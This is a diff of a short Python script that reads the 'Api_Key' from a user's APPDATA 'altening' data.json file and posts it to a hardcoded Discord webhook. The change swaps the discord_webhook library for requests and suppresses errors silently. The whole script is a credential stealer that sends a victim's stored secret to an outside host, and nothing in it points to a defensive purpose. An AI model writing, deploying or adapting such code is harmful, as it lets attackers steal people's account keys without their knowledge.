@@ -1,23 +1,24 @@
 import os
 import json
-from discord_webhook import DiscordWebhook
-from importlib.resources import path
-
+import requests
 
 #enter you webhook url here
-WEBHOOK_URL = ""
+WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/847995389097017344/H_od7O2S49cfV8dlOnX7cEE8z-2XuYSFbjDEbmiglcjgp-p05SlcFWPOmi9Z_va5hYne"
 
+def main():
 
-roaming = os.getenv('APPDATA')
-key = roaming + '\\altening\\data.json'
-if os.path.exists(key):
-    with open(key) as c:
-        json = json.load(c)
-    API = json.get("Api_Key")
-    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**API** ```\n{API}```"))
-    response = f.execute()
-else:
-    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**API** ```\nAPI not found.```"))
-    response = f.execute()
+    path = os.getenv('APPDATA') + '\\altening\\data.json'
+    if os.path.exists(path):
+        with open(path) as path:
+            api = json.load(path)
+    key = api.get("Api_Key")
+
+    try:
+        requests.post(WEBHOOK_URL,json = {'content' : f'```{key}```'} )
+    except:
+        pass
+
+if __name__ == '__main__':
+    main()
 
 
